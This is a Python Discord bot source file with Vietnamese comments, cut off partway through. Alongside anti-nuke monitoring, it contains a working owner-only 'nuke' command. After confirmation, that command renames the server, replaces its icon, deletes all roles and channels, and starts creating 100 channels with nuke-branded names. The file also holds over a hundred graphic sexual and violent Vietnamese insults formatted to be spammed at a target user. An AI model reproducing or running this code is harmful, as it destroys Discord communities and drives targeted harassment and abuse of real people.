import asyncio
import os
import random
import time
import json
from collections import defaultdict, deque
import discord
from discord.ext import commands
from groq import Groq
import aiohttp

# ==================== CẤU HÌNH HỆ THỐNG TỐI TÂN ====================
DISCORD_TOKEN = os.getenv("TOKEN")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

groq_client = Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1531882555664629861,  
    1535132569534865490,
    1454570566517260422,
    1536264763427000391,
]

# Kênh log cố định (ID lấy từ link bạn cung cấp)
LOG_CHANNEL_ID = 1537813100546236497

# ==================== LOAD CONFIG ANTI-NUKE (NẾU CÓ) ====================
CONFIG = {}
if os.path.exists("config.json"):
    try:
        with open("config.json", "r", encoding="utf-8") as f:
            CONFIG = json.load(f)
    except Exception:
        pass

THRESHOLDS = CONFIG.get("THRESHOLDS", {"channel_delete": 3, "role_delete": 3, "ban": 2})
TIME_WINDOW = THRESHOLDS.get("time_window", 5)
WHITELISTED_USERS = set(CONFIG.get("WHITELISTED_USERS", []))
WHITELISTED_ROLES = set(CONFIG.get("WHITELISTED_ROLES", []))
WHITELISTED_BOTS = set(CONFIG.get("WHITELISTED_BOTS", []))

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True
intents.bans = True
intents.webhooks = True

# Tiền tố độc quyền l!
bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)

current_persona_id = 1
last_active_persona_id = 1
bot_stopped = False
is_spamming = False  
spam_task_running = None

# Lưu trữ số dư coin của member: {user_id: coin_balance}
USER_COINS = {}

NUKE_LOG_CHANNELS = {}

# Lưu trữ yêu cầu nhân cách tùy chỉnh của member từ lệnh l!setpersona
CUSTOM_USER_PERSONAS = {}

# ==================== TRACKING ANTI-NUKE ====================
action_history = defaultdict(lambda: deque(maxlen=50))
lockdown_active = False

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/a3/30/8c/a3308c2100e2526873b3ae8b3ab47b57.gif"
NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa667260ec4d.jpg"

# ==================== KHO SPAM ĐẦY ĐỦ (209 CÂU CÓ DẤU #) ====================
ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn già nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn già nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ già nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn già thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn già chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

WORK_SCENARIOS = [
    "bạn đã cặm cụi fix một đống bug code lỗi sản phẩm cho Boss Bảo và nhận được",
    "bạn vừa thức trắng đêm để thiết kế giao diện đồ họa siêu cấp độc quyền cho Boss Bảo và kiếm về",
    "bạn đi lụm ve chai phế liệu công nghệ cao ngoài hành lang căn cứ và bán được",
    "bạn tham gia sự kiện hack bảo mật hệ thống vũ trụ ảo và giật giải thưởng lớn trị giá",
    "bạn làm chân sai vật vạ pha trà sữa trân châu đường đen dâng lên Boss Bảo và được thưởng nóng",
    "bạn viết một đoạn văn ca tụng vẻ đẹp tuyệt trần của Boss Bảo và được hệ thống ban phát",
    "bạn dọn dẹp sạch sẽ phòng làm việc tối mật của Boss Bảo và nhặt được phong bì rơi",
    "bạn train thành công một con AI trợ lý ảo chuyên nghiệp cho Boss Bảo và nhận hoa hồng",
    "bạn đi cấu vé số vận mệnh vũ trụ may mắn và trúng độc đắc mang về",
    "bạn nhận nhiệm vụ bảo vệ cổng thành không gian và đánh bại quái vật boss phụ, nhận thưởng",
    "bạn phụ bếp nấu bữa tối hoàng gia cực kỳ thịnh soạn theo đúng gu của Boss Bảo, nhận ngay",
    "bạn biên soạn thành công 500 dòng tài liệu hướng dẫn tối tân cho tân thủ, nhận lương cứng",
    "bạn đi câu cá mập không gian tại ngân hà và đem bán lấy tiền thưởng",
    "bạn hoàn thành bài kiểm tra đạo đức phò tá Boss Bảo xuất sắc tuyệt đối, nhận phần thưởng",
    "bạn tham gia đại hội tỷ thí lập trình viên xuất sắc nhất server và giành cúp vàng kèm theo",
    "bạn đi khai thác quặng tinh thể hồng ngọc quý hiếm dưới lòng đất sâu thẳm, thu về",
    "bạn làm shipper giao tài liệu mật xuyên không gian cho Boss Bảo đúng hạn, nhận tiền công",
    "bạn biểu diễn tấu hài múa lửa phục vụ giải trí cho toàn bộ căn cứ của Boss Bảo, nhận thù lao",
    "bạn tinh chỉnh lại toàn bộ băng thông đường truyền mạng siêu tốc, nhận phần thưởng tối ưu",
    "bạn đi tìm kiếm các mảnh ghép kho báu huyền thoại bị thất lạc hàng ngàn năm, đổi được",
    "bạn làm trợ giảng lớp học huấn luyện tân binh bot discord của Boss Bảo, nhận học bổng",
    "bạn quét dọn kho lưu trữ dữ liệu cũ rích và thu gom các linh kiện bán cổ vật đổi lấy",
    "bạn tham gia trò chơi trốn tìm không gian với các bot khác và chiến thắng ngoạn mục,",
    "bạn viết hộ một bài thơ tình lãng mạn siêu ngọt ngào dâng lên Boss Bảo, nhận lộc lớn",
    "bạn đi săn bắt các con bug lỗi phần mềm cứng đầu trốn trong hệ thống, nhận tiền thưởng nóng",
    "bạn nhận làm bảo kê quán cà phê ảo của server trong một tuần lễ, thu về lương khủng",
    "bạn sáng tác một bản nhạc chuông điện thoại độc quyền cực hay cho Boss Bảo, nhận hoa hồng",
    "bạn đi trồng cây hoa hướng dương hồng thần kỳ khắp các khu vườn server, thu hoạch được",
    "bạn trực tổng đài giải đáp thắc mắc không ngừng nghỉ cho các thành viên mới, nhận lương tuần",
    "bạn đi làm từ thiện phát lương thực ảo cho các tài khoản nghèo khổ trong server, được trả công",
    "bạn tinh chỉnh bộ lọc ngôn từ độc hại giúp căn cứ trong sạch hơn, nhận phần thưởng chuyên cần",
    "bạn tham gia thử thách ăn 100 tô mì cay không gian khổng lồ và chiến thắng, nhận giải thưởng",
    "bạn thiết kế bộ sticker hình mèo con dễ thương thả thính tặng Boss Bảo, nhận thưởng lớn",
    "bạn đi thám hiểm vùng đất hoang vu chưa từng có ai đặt chân tới và khai phá tài nguyên",
    "bạn làm trọng tài công tâm cho các trận chiến minigame giữa các thành viên, nhận thù lao",
    "bạn sáng chế ra một loại thuốc bổ trợ năng lượng siêu tốc cho bot, bán bản quyền thu về",
    "bạn nhận nhiệm vụ bảo trì toàn bộ hệ thống máy chủ phụ trong đêm, nhận phụ cấp đêm",
    "bạn viết kịch bản cho một bộ phim điện ảnh ngắn về hành trình phục vụ Boss Bảo, nhận nhuận bút",
    "bạn đi gom nhặt những giọt sương mai tinh khiết nhất vũ trụ dâng lên Boss Bảo, nhận lộc",
    "bạn tham gia cuộc thi thiết kế biểu tượng cảm xúc độc lạ cho server và giành giải thưởng",
    "bạn hoàn thành xuất sắc ca trực gác cổng không gian suốt 24 tiếng đồng hồ, nhận thưởng",
    "bạn đi nhặt các đồng coin rơi rớt dọc theo các kênh chat cũ kỹ của server, tổng cộng nhặt được",
    "bạn phụ trách việc trang trí lộng lẫy toàn bộ kênh thông báo chính bằng sắc hồng, nhận lương",
    "bạn tham gia phiên đấu giá vật phẩm quý hiếm và buôn bán thành công một món đồ, lãi khủng",
    "bạn giải mã thành công mật mã cổ đại do Boss Bảo đặt ra để thử thách, nhận phần thưởng",
    "bạn đi làm phục vụ tại nhà hàng ảo cao cấp nhất do Boss Bảo quản lý, nhận tiền típ",
    "bạn chế tạo thành công một cỗ máy thời gian mini chạy bằng năng lượng tình yêu, bán được",
    "bạn tham gia dọn dẹp rác thải điện tử kỹ thuật số tại các ổ cứng hỏng, thu gom được",
    "bạn làm hướng dẫn viên du lịch không gian dẫn đoàn tân binh tham quan server, nhận thù lao",
    "bạn hoàn thành trọn vẹn chuỗi 50 nhiệm vụ tối thượng phục vụ Boss Bảo và nhận phần thưởng"
]

NUKE_CHANNEL_NAMES = [
    "NUKE BY LUNAL KINGDOM",
    "NUKE BY BẢO ĐẸP ZAI",
    "NUKE BY BOT NUKE ON TOP",
    "DETROYED BY BOT NUKE EZ TOP"
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== CÁC HÀM HỖ TRỢ ANTI-NUKE ====================
def is_whitelisted(user: discord.User) -> bool:
    if user.id in WHITELISTED_USERS:
        return True
    if user.bot and user.id in WHITELISTED_BOTS:
        return False
    return False

async def log_event(guild: discord.Guild, title: str, description: str, color=0xFF0000):
    if not LOG_CHANNEL_ID:
        return
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if not channel:
        return
    embed = discord.Embed(title=title, description=description, color=color, timestamp=discord.utils.utcnow())
    embed.set_footer(text=f"Guild: {guild.name}")
    await channel.send(embed=embed)

async def ban_user(member: discord.Member, reason: str):
    try:
        await member.ban(reason=reason, delete_message_days=0)
        await log_event(member.guild, "🚨 ĐÃ BAN KẺ TẤN CÔNG", f"Đã ban {member.mention} (ID: {member.id})\nLý do: {reason}")
    except Exception as e:
        await log_event(member.guild, "⚠️ LỖI KHI BAN", f"{e}")

async def activate_lockdown(guild: discord.Guild):
    global lockdown_active
    if lockdown_active:
        return
    lockdown_active = True
    try:
        everyone = guild.default_role
        await everyone.edit(permissions=discord.Permissions(create_instant_invite=False))
        await log_event(guild, "🔒 LOCKDOWN KÍCH HOẠT", "Đã tạm thời vô hiệu hóa quyền tạo kênh/vai trò cho tất cả thành viên.")
    except Exception as e:
        await log_event(guild, "⚠️ LỖI LOCKDOWN", f"{e}")

async def deactivate_lockdown(guild: discord.Guild):
    global lockdown_active
    if not lockdown_active:
        return
    lockdown_active = False
    try:
        everyone = guild.default_role
        await everyone.edit(permissions=discord.Permissions.none())
        await log_event(guild, "🔓 LOCKDOWN HỦY BỎ", "Đã mở khóa server.")
    except Exception as e:
        await log_event(guild, "⚠️ LỖI HỦY LOCKDOWN", f"{e}")

# ==================== EVENT AUDIT LOG CHO ANTI-NUKE ====================
@bot.event
async def on_audit_log_entry(entry: discord.AuditLogEntry):
    if not entry.guild:
        return
    guild = entry.guild
    user = entry.user
    if not user or user.id == bot.user.id or is_whitelisted(user):
        return

    action_type = entry.action
    now = time.time()

    dangerous_actions = {
        discord.AuditLogAction.channel_delete: "channel_delete",
        discord.AuditLogAction.role_delete: "role_delete",
        discord.AuditLogAction.ban: "ban",
        discord.AuditLogAction.webhook_create: "webhook_create",
        discord.AuditLogAction.role_update: "permission_update",
        discord.AuditLogAction.channel_update: "permission_update",
        discord.AuditLogAction.overwrite_update: "permission_update",
        discord.AuditLogAction.member_update: "permission_update"
    }

    if action_type not in dangerous_actions:
        return

    action_key = dangerous_actions[action_type]
    threshold = THRESHOLDS.get(action_key, 3)

    history = action_history[user.id]
    history.append(now)

    window_start = now - TIME_WINDOW
    recent = [t for t in history if t >= window_start]
    if len(recent) >= threshold:
        await log_event(guild, f"⚠️ PHÁT HIỆN TẤN CÔNG - {action_key}", f"User {user.mention} (ID: {user.id}) đã thực hiện {len(recent)} lần {action_key} trong {TIME_WINDOW}s.")
        member = guild.get_member(user.id)
        if member:
            await ban_user(member, f"Auto-ban: {len(recent)} hành động {action_key} trong {TIME_WINDOW}s")
        await activate_lockdown(guild)
        await asyncio.sleep(30)
        await deactivate_lockdown(guild)

# ==================== LỆNH QUẢN LÝ OWNER (OWNERTAG / DELETEOWNER) ====================
@bot.command(name="ownertag")
@is_bot_owner()
async def ownertag(ctx, member: discord.Member = None):
    global BOT_OWNERS
    if member is None:
        await ctx.send("📌 Dùng `l!ownertag @user` để thêm người đó làm chủ bot.")
        return
    if member.id in BOT_OWNERS:
        await ctx.send(f"❌ {member.mention} đã là chủ bot rồi.")
        return
    BOT_OWNERS.append(member.id)
    embed = discord.Embed(
        title="✅ Đã thêm chủ bot",
        description=f"👑 {member.mention} đã được thêm vào danh sách chủ sở hữu bot.",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, member: discord.Member = None):
    global BOT_OWNERS
    if member is None:
        await ctx.send("📌 Dùng `l!deleteowner @user` để xóa người đó khỏi danh sách chủ bot.")
        return
    if member.id not in BOT_OWNERS:
        await ctx.send(f"❌ {member.mention} không có trong danh sách chủ bot.")
        return
    BOT_OWNERS.remove(member.id)
    embed = discord.Embed(
        title="✅ Đã xóa chủ bot",
        description=f"👑 {member.mention} đã bị xóa khỏi danh sách chủ sở hữu bot.",
        color=0xFF0000
    )
    await ctx.send(embed=embed)

# ==================== LỆNH NUKE SERVER TỐI ƯU TỐC ĐỘ ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới với tên tục tĩu, sau đó spam nội dung yêu cầu"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ:\n"
                f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
                f"• Spam thông điệp nuke trong mỗi kênh\n"
                f"• Đổi tên server thành **DEAD SEVER**\n"
                f"• Đổi avatar server\n\n"
                f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmnuke":
                await ctx.send("❌ Lệnh nuke đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh nuke đã bị hủy bỏ.")
            return

        # 🔥 GỬI LOG BẮT ĐẦU (tới kênh log cố định)
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        old_name = ctx.guild.name
        old_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"

        if log_channel:
            start_embed = discord.Embed(
                title="🔥 NUKE BẮT ĐẦU",
                description=f"**Server cũ:** {old_name}\n**Avatar cũ:** {old_icon_url}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                color=0xFF0000,
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=start_embed)

        nuke_embed = discord.Embed(
            title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
            description="🔥 **Đang thực hiện phá hủy toàn bộ server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=nuke_embed)

        # 1. Spam default channel
        if log_channel:
            log_embed = discord.Embed(title="Spamming default channel...", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        try:
            await ctx.send("Spam default channel trước khi nuke!")
        except:
            pass

        # 2. Renaming server
        if log_channel:
            log_embed = discord.Embed(title="Renaming server...", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        try:
            await ctx.guild.edit(name="DEAD SEVER")
        except Exception as e:
            print(f"Lỗi đổi tên: {e}")

        # 3. Đổi avatar
        if log_channel:
            log_embed = discord.Embed(title="Đã đổi avatar server.", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(NUKE_AVATAR_URL) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await ctx.guild.edit(icon=image_data)
        except Exception as e:
            print(f"Lỗi đổi avatar: {e}")

        # 4. Starting role deletion
        if log_channel:
            log_embed = discord.Embed(title="Starting role deletion...", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    continue

        # 5. Starting channel deletion
        if log_channel:
            log_embed = discord.Embed(title="Starting channel deletion...", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        delete_tasks = []
        for channel in ctx.guild.channels:
            delete_tasks.append(channel.delete())
            if len(delete_tasks) >= 5:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
                delete_tasks.clear()
                await asyncio.sleep(0.1)
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        # 6. Starting channel creation
        if log_channel:
            log_embed = discord.Embed(title="Starting channel creation...", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        create_tasks = []
        for i in range(100):
            channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
            create_tasks.append(ctx.guild.create_text_channel(name=channel_name))
